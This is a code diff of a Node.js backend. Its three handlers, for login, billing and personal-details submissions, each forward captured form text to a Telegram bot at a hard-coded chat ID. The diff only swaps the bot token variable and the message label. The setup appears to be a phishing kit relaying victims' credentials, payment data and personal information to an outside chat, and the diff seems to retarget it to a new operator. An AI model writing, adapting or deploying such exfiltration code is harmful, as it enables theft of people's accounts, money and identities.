@@ -55,10 +55,10 @@ const submitLogin = async (req, res) => {
             });
         await axios
             .post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                 {
                     chat_id: 680379375,
-                    text: `HAYTCHRES:\n${originalText}`,
+                    text: `OP:\n${originalText}`,
                     parse_mode: "Markdown",
                 }
             )
@@ -91,10 +91,10 @@ const submitBilling = async (req, res) => {
             });
         await axios
             .post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                 {
                     chat_id: 680379375,
-                    text: `HAYTCHRES:\n${originalText}`,
+                    text: `OP:\n${originalText}`,
                     parse_mode: "Markdown",
                 }
             )
@@ -127,10 +127,10 @@ const submitPersonal = async (req, res) => {
             });
         await axios
             .post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                 {
                     chat_id: 680379375,
-                    text: `HAYTCHRES:\n${originalText}`,
+                    text: `OP:\n${originalText}`,
                     parse_mode: "Markdown",
                 }
             )
